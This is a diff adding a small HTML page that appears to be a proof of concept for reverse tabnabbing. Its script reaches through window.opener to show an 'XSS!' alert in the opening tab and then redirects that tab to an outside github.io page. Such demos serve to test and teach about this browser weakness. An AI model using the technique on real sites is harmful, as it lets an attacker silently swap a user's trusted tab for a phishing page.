@@ -1,0 +1,13 @@
+<html>
+<body>
+<script>
+    if (window.opener) {
+        window.opener.alert('XSS!');
+        opener.location = 'https://jjpinkman.github.io/index.html';
+    }
+</script>
+<h1>
+SOMEONE ELSE PAGE
+</h1>
+</body>
+</html>
